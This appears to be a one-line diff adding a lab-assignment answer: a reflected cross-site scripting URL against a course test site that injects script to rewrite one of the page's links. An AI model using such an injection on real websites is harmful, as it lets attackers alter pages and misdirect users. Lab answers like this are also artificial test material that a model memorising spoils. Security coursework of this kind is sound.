@@ -1,0 +1,1 @@
+http://bungle-cs461.csl.illinois.edu/multivac/?name=<script+src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script><script>$(document).ready(function(){$('a[href="http://cs.illinois.edu/"]').attr('href','http://www.ece.illinois.edu/');});</script>
